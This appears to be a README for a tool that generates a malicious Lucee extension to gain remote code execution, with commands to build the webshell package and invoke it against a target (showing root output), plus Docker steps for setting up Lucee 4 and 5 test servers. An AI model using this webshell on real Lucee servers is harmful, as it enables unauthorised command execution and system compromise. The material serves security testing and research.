
## 

### Written by Juan Pablo Gomez (https://github.com/JPG0mez) and Will Vandevanter (https://github.com/BuffaloWill)

### Building a Shell

The blog post linked above walks through how to manually create the Lucee extension. 

You can also use the extension-generator.py script in this repository to generate an extension for remote code execution:

```bash
python3 extension-generator.py build

Auth_code already set: lErs2CC2BdpUtHYW0miiSNncE
Generating LEX package...
webshell/package.lex created.
```

At this point upload the Extension into the Lucee installation. 

Then call the webshell with:

```bash
python3 extension-generator.py --url http://localhost:8888 --auth-code lErs2CC2BdpUtHYW0miiSNncE id

uid=0(root) gid=0(root) groups=0(root)
```

### Testing Lucee

The easiest way to test Lucee functionality is with Docker. To spin up a Lucee docker instance that matches your target,

#### Docker - Lucee 5:

Note, lucee 5 does not ship with a password. You will need to start the server with:

```
docker run --name lucee5 -p 8888:8888 --platform linux/amd64 lucee/lucee:5.3.9.141-nginx
```

After the application finishes loading, there should be a Server page at [Server Login](http://127.0.0.1:8888/lucee/admin/server.cfm) that will mention a password needing to be set. 

This can be done from the cli with:

```
docker exec lucee5 sh -c "echo 'mypassword' > /opt/lucee/server/lucee-server/context/password.txt"
```

After this click "Import File" and you should be able to login.

This blopost also has alternate information on setting the password: 

https://markdrew.io/password-for-lucee-docker

### Docker - Lucee 4 (2018):

Start the server:

```
docker run --name lucee4 -dp 8888:8080 --platform linux/amd64 lucee/lucee4:4.5.5.015
```

Browse to localhost:8888/lucee/admin/server.cfm and set the password.